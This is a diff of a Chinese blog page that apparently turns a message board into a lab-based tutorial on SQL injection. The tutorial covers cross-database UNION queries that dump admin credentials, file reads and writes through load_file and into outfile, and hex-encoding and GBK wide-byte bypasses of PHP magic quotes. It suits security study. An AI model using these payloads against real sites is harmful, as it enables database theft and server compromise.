@@ -5,7 +5,7 @@
 <head>
 
     <meta charset="utf-8">
-    <meta name="keywords" content="留言板, Xxu">
+    <meta name="keywords" content="SQL漏洞-高低权限注入&amp;敏感文件读写, Xxu">
     <meta name="description" content="记录学习过程，分享个人经验">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -18,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>留言板 | Xxu</title>
+    <title>SQL漏洞-高低权限注入&amp;敏感文件读写 | Xxu</title>
 
     <link rel="icon" type="image/jpeg" href="https://s1.ax1x.com/2020/05/17/YR20js.jpg">
 
@@ -507,86 +507,441 @@
 
 </header>
 
-    <div class="bg-cover pd-header about-cover">
-    <div class="container">
-    <div class="row">
-    <div class="col s10 offset-s1 m8 offset-m2 l8 offset-l2">
-        <div class="brand">
-            <div class="title center-align">
-                
-                Xxuの个人博客
-                
-            </div>
-
-            <div class="description center-align">
-                
-                <span id="subtitle"></span>
-                <script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11"></script>
-                <script>
-                    var typed = new Typed("#subtitle", {
-                        strings: ['归根结底，我们爱的不是欲望之物，而是欲望本身。','Ultimately, it is the desire, not the desired, that we love.'],
-                        startDelay: 300,
-                        typeSpeed: 70,
-                        loop: true,
-                        backSpeed: 70,
-                        showCursor: true
-                    });
-                </script>
-                
-            </div>
-        </div>
-    </div>
-</div>
-
-
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
-    $('.bg-cover').css('background-image', 'url(/medias/banner/0.jpg)');
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
 </script>
 
 
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021744.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">SQL漏洞-高低权限注入&amp;敏感文件读写</h1>
+                </div>
+            </div>
+        </div>
     </div>
 </div>
 
-<main class="content">
-    <div id="contact" class="container chip-container">
-        <div class="card">
-            <div class="card-content">
-                <div class="tag-title center-align">
-                    <i class="fas fa-comments"></i>&nbsp;&nbsp;留言板
-                </div>
-<script>$.get("https://v1.hitokoto.cn?c=i&c=j&c=d&c=h",function(data,status){if(status=='success'){$('#poem').html(data.hitokoto);if(data.from_who!=null){$('#info').html(data.from_who+" · "+"《 "+data.from+" 》");}else{$('#info').html(data.from);}}else{$('#poem').html("获取出错啦");}});</script>
-    <!-- 加入网易云音乐热门评论，实时更新 -->
-    <div class="poem-wrap">
-        <div class="poem-border poem-left">
-        </div>
-        <div class="poem-border poem-right">
-        </div>
-        <h1>一言</h1>
-        <p id="poem"></p>
-        <p id="info"></p>
-    </div>
-                <h2 id="畅所欲言"><a href="#畅所欲言" class="headerlink" title="畅所欲言"></a>畅所欲言</h2><hr>
-<p>在这里可以留下你的足迹，欢迎在下方留言，欢迎交换友链，一起交流学习！</p>
-<h2 id="友链"><a href="#友链" class="headerlink" title="友链"></a>友链</h2><hr>
-<p>Xxuの友链信息</p>
-<p>博客名称: Xxuの博客</p>
-<p>博客网址: <a target="_blank" rel="noopener" href="http://www.jxblogs.com/">http://www.jxblogs.com</a></p>
-<p>博客头像: <a target="_blank" rel="noopener" href="https://s1.ax1x.com/2020/05/17/YRWsYT.png">https://s1.ax1x.com/2020/05/17/YRWsYT.png</a></p>
-<p>博客介绍: The harder you work, the luckier you will be</p>
 
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        background-color: white;
+        width: 345px;
+        padding-left: 20px;
+        border-radius: 10px;
+        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+    
+    #toc-content {
+        height: calc(100vh - 300px);
+        overflow: scroll;
+
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+        bottom: 120px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/web%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">web渗透</span>
+                            </a>
+                        
+                            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">SQL注入</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/web%E6%B8%97%E9%80%8F/" class="post-category">
+                                -web渗透
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+				
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-11-26
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2021-11-26
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.6k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    6 分
+                </div>
+                
+
+                
             </div>
         </div>
-        <div class="card">
-            
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="SQL漏洞-高低权限注入-amp-敏感文件读写"><a href="#SQL漏洞-高低权限注入-amp-敏感文件读写" class="headerlink" title="SQL漏洞-高低权限注入&amp;敏感文件读写"></a>SQL漏洞-高低权限注入&amp;敏感文件读写</h1><blockquote>
+<p>sql注入漏洞的危害：拖库</p>
+</blockquote>
+<h2 id="高权限注入及低权限注入"><a href="#高权限注入及低权限注入" class="headerlink" title="高权限注入及低权限注入"></a>高权限注入及低权限注入</h2><table>
+<thead>
+<tr>
+<th align="center">网站</th>
+<th align="center">管理员</th>
+<th align="center">数据库</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">A</td>
+<td align="center">A</td>
+<td align="center">A</td>
+</tr>
+<tr>
+<td align="center">B</td>
+<td align="center">B</td>
+<td align="center">B</td>
+</tr>
+</tbody></table>
+<p>网站A与B在同一台服务器下，分别由不同的管理员管理并且拥有自己独立的数据库，互不影响互不干扰。但是如果网站A被拿到管理员账户，基于mysql5.0以上环境，可以对网站B 进行一个跨库查询从而获取到B的敏感信息。而低权限只限于本库查询，无法进行跨库查询</p>
+<blockquote>
+<p>跨库查询思路  前提：1、拥有高权限 2、在同一台服务器下 3、数据库5.0以上版本</p>
+</blockquote>
+<h3 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h3><p>网站A：sqlilab靶场，已经获取到root用户，拥有最高权限</p>
+<p> <img src="http://qiniu.jxblogs.com/image-20211126095551670.png"></p>
+<p>网站B：大米CMS，与网站A在同一服务器下，自主搭建，无WAF<img src="http://qiniu.jxblogs.com/image-20211126104905624.png"></p>
+<h4 id="1、获取B网站数据库"><a href="#1、获取B网站数据库" class="headerlink" title="1、获取B网站数据库"></a>1、获取B网站数据库</h4><p>在information_schema底下有一张表叫做schemata，里面包含了所有数据库的信息，其中列schema_name，包含了所有数据库的名称，跨网站第一步，需要获取的就是该网站的数据库名称，注入表达式：</p>
+<pre class="line-numbers language-none"><code class="language-none">union select 1,group_concat(schema_name),3 from information_schema.schemata--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="http://qiniu.jxblogs.com/image-20211126105232387.png"></p>
+<p>成功获取到数据库名称：damidb</p>
+<h4 id="2、获取数据库关键表"><a href="#2、获取数据库关键表" class="headerlink" title="2、获取数据库关键表"></a>2、获取数据库关键表</h4><p>需要从记录所有表名的一张表information_schema.tables里的列table_name来查找当前表名，不过需要指定数据库为damidb，注入表达式</p>
+<pre class="line-numbers language-none"><code class="language-none">union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='damidb'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="http://qiniu.jxblogs.com/image-20211126110030083.png"></p>
+<p>不出意外，关键信息就在dami_admin这张表里</p>
+<h4 id="3、获取指定数据库指定表下的列名信息"><a href="#3、获取指定数据库指定表下的列名信息" class="headerlink" title="3、获取指定数据库指定表下的列名信息"></a>3、获取指定数据库指定表下的列名信息</h4><p>需要获取信息，将table_name该为column_name，information_schema.tables改为information_schema.columns</p>
+<pre class="line-numbers language-none"><code class="language-none">union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='damidb'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="http://qiniu.jxblogs.com/image-20211126110522377.png"></p>
+<p>观察列名信息，发现获取的列名是当前数据库下所有表的列名信息，所以还需要指定表dami_admin</p>
+<pre class="line-numbers language-none"><code class="language-none">union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='damidb' and table_name='dami_admin'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="http://qiniu.jxblogs.com/image-20211126110702078.png"></p>
+<p>此时成功回显当前表名数据，可以看出username和password才是我们需要的东西</p>
+<h4 id="4、根据列名信息查找关键数据"><a href="#4、根据列名信息查找关键数据" class="headerlink" title="4、根据列名信息查找关键数据"></a>4、根据列名信息查找关键数据</h4><p>将2，3替换为username和password同时指定数据库名和表名进行精准查找</p>
+<pre class="line-numbers language-none"><code class="language-none">union select 1,username,password from damidb.dami_admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p> <img src="http://qiniu.jxblogs.com/image-20211126111053622.png"></p>
+<p>成功获取到admin账户密码</p>
+<h2 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作"></a>文件读写操作</h2><p>在Mysql中有两条特有的文件操作函数：</p>
+<pre class="line-numbers language-none"><code class="language-none">1、load_file()   --- 读取函数
+2、into outfile 或 into dumpfile --- 导出函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>前提条件：在mysql.ini配置文件添加参数secure_file_priv = [空]</p>
+</blockquote>
+<p>例如，我们在服务器C盘底下创建一个1.txt</p>
+<p> <img src="http://qiniu.jxblogs.com/image-20211126112253985.png"></p>
+<p>此时在网页使用文件读写函数注入，查看结果</p>
+<pre class="line-numbers language-none"><code class="language-none">union select 1,load_file('C://1.txt'),3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p> <img src="http://qiniu.jxblogs.com/image-20211126112943614.png"></p>
+<p>成功读取本地文件，接下来尝试往C盘中写入文件</p>
+<pre class="line-numbers language-none"><code class="language-none">union select 1,'Xxu',3 into outfile'C://2.txt'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p> <img src="http://qiniu.jxblogs.com/image-20211126113409348.png"></p>
+<p>没有显示代表写入成功，看看C盘下有没有多出2.txt文件</p>
+<p> <img src="http://qiniu.jxblogs.com/image-20211126113458899.png"></p>
+<p>发现文件成功写入，并且1，2，3都被写入了，那如果我们不想要1和3，只写入2呢</p>
+<pre class="line-numbers language-none"><code class="language-none">union select 'Xxu' into outfile'C://3.txt'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p> <img src="http://qiniu.jxblogs.com/image-20211126113724952.png"></p>
+<p>这里报错了，说明写入时也必须按列数来写入，这些是不可或缺的</p>
+<blockquote>
+<p>这里需要注意的点是：</p>
+<p>load_file(‘C://1.txt’)后面的路径得加括号，并且是通过替换2和3来回显数据的</p>
+<p>into outfile’C://3.txt’后面的路径只需要加单引号，但是是跟在123的后面，将123的数据</p>
+<p>替换为想要写入的内容来写入的，写入数据时需要加单引号</p>
+</blockquote>
+<h3 id="路径获取常见方法"><a href="#路径获取常见方法" class="headerlink" title="路径获取常见方法"></a>路径获取常见方法</h3><ul>
+<li>报错显示：有一些网站在维护的时候会报错，会出现一些路径信息</li>
+<li>遗留文件：php会在默认网站目录下留下phpinfo.php，里面有很多信息</li>
+<li>漏洞报错：特定的CMS有特定的配置文件，位置一般是不会变的，例如phpcms暴路径漏洞</li>
+<li>平台配置文件：例如apache搭建的网站在conf文件夹下有httpd.conf文件</li>
+<li>爆破：暴力手段类似子域名挖掘机，sqlmap等扫描工具可以扫描后台路径</li>
+<li>常见的load_file()读取的敏感信息：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30292843/article/details/99381669">点我进入查看</a></li>
+</ul>
+<h2 id="常见文件操作问题-魔术引号"><a href="#常见文件操作问题-魔术引号" class="headerlink" title="常见文件操作问题:魔术引号"></a>常见文件操作问题:魔术引号</h2><p>魔术引号开关在php.ini配置文件中有magic_quotes_gpc，在php5.4.0以下版本是默认开着的它是php内置的一个安全机制，当打开时，会对所有的 ‘（单引号），”（双引号），\（反斜线）和 NULL 字符自动加上一个反斜线进行转义  </p>
+<h3 id="1、表现特征"><a href="#1、表现特征" class="headerlink" title="1、表现特征"></a>1、表现特征</h3><p><img src="http://qiniu.jxblogs.com/image-20211126115942340.png"></p>
+<p>可以看到，在开启了魔术引号后，所有的路径符号都加上了一个反斜杠，这一点可以看出此刻网站用的是php5.4.0以下的版本</p>
+<h3 id="2、绕过方式"><a href="#2、绕过方式" class="headerlink" title="2、绕过方式"></a>2、绕过方式</h3><h4 id="1-编码绕过"><a href="#1-编码绕过" class="headerlink" title="1.编码绕过"></a>1.编码绕过</h4><p>将路径信息转换为十六进制用以绕过魔术引号，而十六进制能被url正确解码</p>
+<p> <img src="http://qiniu.jxblogs.com/image-20211126121512434.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">此刻需要读取的路径：C://1.txt
+十六进制转码后：0x433A2F2F312E747874
+注入表达式：union select 1,load_file(0x433A2F2F312E747874),3--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>由于已经进行了编码，所以不需要再加单引号了</p>
+<p> <img src="http://qiniu.jxblogs.com/image-20211126121714255.png"></p>
+<p>结果：成功绕过</p>
+<h4 id="2-宽字节绕过"><a href="#2-宽字节绕过" class="headerlink" title="2.宽字节绕过"></a>2.宽字节绕过</h4><p> 演示：<a target="_blank" rel="noopener" href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">线上靶场</a><img src="http://qiniu.jxblogs.com/image-20211126122016506.png"></p>
+<p>此时已经用单引号进行闭合，不过还是被魔术引号加了反斜杠转义，使得后面语句无法执行</p>
+<p><strong>宽字节绕过原理：</strong></p>
+<ul>
+<li><strong><em>\</em>比如使用%df’:会被PHP当中的addslashes函数转义为“ %df’ ”。**</strong></li>
+<li><strong>“ \ ”即url里面的“ %5c ”, “ ’ ”对应的url编码是“%27”，那么也就是说，“ %df’ ”会被转义“ %df%5c%27 ”</strong></li>
+<li><strong>倘若网站的字符集是GBK，mysql使用的编码也是GBK的话，就会认为“ %df%5c%27 ”是一个宽字节。</strong></li>
+<li><strong>“ %df%5c ”会结合(因为宽字节是占两个字节)，也就是“縗” 。后面就有一个“ ’ ”。就造成了一个攻击效果。**</strong></li>
+</ul>
+<p>此时我们将id=1’变为id=1%df’，注入表达式,查看结果</p>
+<pre class="line-numbers language-none"><code class="language-none">id=1%df' order by 2--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="http://qiniu.jxblogs.com/image-20211126123041762.png"></p>
+<p>发现此时的1后面的%df加了反斜杠被转义后变成了%df%5c，加上后面单引号变为了%27，所以整个1%df’在页面上变为了’1綅’完成了一个闭合，在mysql中1后面的则是一个宽字节，通过这样的方式完成了魔术引号的绕过</p>
+<p>参考博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a></p>
+<p>​                   <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/105893529">https://blog.csdn.net/qq_46091464/article/details/105893529</a></p>
+
+                
+            </div>
+            <hr/>
 
             
 
-            
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Xxu</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://jxblogs.com/posts/83a1acb4.html">https://jxblogs.com/posts/83a1acb4.html</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Xxu</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
 
-            
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
 
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/web%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">web渗透</span>
+                                </a>
+                            
+                                <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">SQL注入</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="qq,qzone,wechat,weibo,twitter,facebook,google,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
             
-            <style>
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
     .valine-card {
         margin: 1.5rem auto;
     }
@@ -887,15 +1242,284 @@ new Valine({
 
 
 
-            
-			
-			
+    
 
-            
+    
 
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/posts/83a1acb4.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928021744.jpg" class="responsive-img" alt="SQL漏洞-高低权限注入&amp;敏感文件读写">
+                        
+                        <span class="card-title">SQL漏洞-高低权限注入&amp;敏感文件读写</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            同服务器下不同站点高权限跨库查询方式&文件读写操作以及靶场测试
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E6%B8%97%E9%80%8F/" class="post-category">
+                                    -web渗透
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">web渗透</span>
+                    </a>
+                    
+                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SQL注入</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/posts/fd334196.html">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20200928014929.jpg" class="responsive-img" alt="SQL漏洞-类型&amp;请求方法注入">
+                        
+                        <span class="card-title">SQL漏洞-类型&amp;请求方法注入</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            SQL注入漏洞类型&请求方法介绍以及靶场测试
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E6%B8%97%E9%80%8F/" class="post-category">
+                                    -web渗透
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">web渗透</span>
+                    </a>
+                    
+                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SQL注入</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Xxu<br />'
+            + '文章作者: Xxu<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
         </div>
     </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
 </main>
+
+
 
 
     <footer class="page-footer bg-color">
